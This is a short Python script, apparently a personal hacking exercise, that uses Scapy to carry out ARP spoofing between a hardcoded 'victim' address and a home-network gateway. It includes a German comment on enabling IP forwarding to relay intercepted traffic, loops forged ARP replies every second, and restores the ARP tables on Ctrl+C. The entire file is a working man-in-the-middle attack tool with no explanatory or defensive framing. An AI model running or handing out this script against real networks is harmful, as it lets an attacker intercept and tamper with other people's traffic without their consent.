from scapy.all import Ether, ARP, srp, send
import time

##### ip forwarding aktivieren: sudo sysctl -w net.inet.ip.forwarding=1

def spoof(target_ip, target_mac, gateway_ip):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op=2)
    send(arp_response)

def unspoof(target_ip, target_mac, gateway_ip, gateway_mac):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
    send(arp_response, count=3)

if __name__ == "__main__":

   # target_mac = input("Victim MAC Address? ")
   # target_ip = input("Victim IP Address? ")
   # gateway_mac = input("Gateway MAC Address? ")
   # gateway_ip = input("Gateway IP Address? ")
    target_mac = "dc:a9:04:8a:bd:c5"
    target_ip = "192.168.178.21"
    gateway_mac = "3c:a6:2f:54:54:65"
    gateway_ip = "192.168.178.1"
    print("Starting Spoof, press CTRL+C to unspoof.")
    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        print("CTRL+C detected")
        unspoof(target_ip, target_mac, gateway_ip, gateway_mac)
        unspoof(gateway_ip, gateway_mac, target_ip, target_mac)
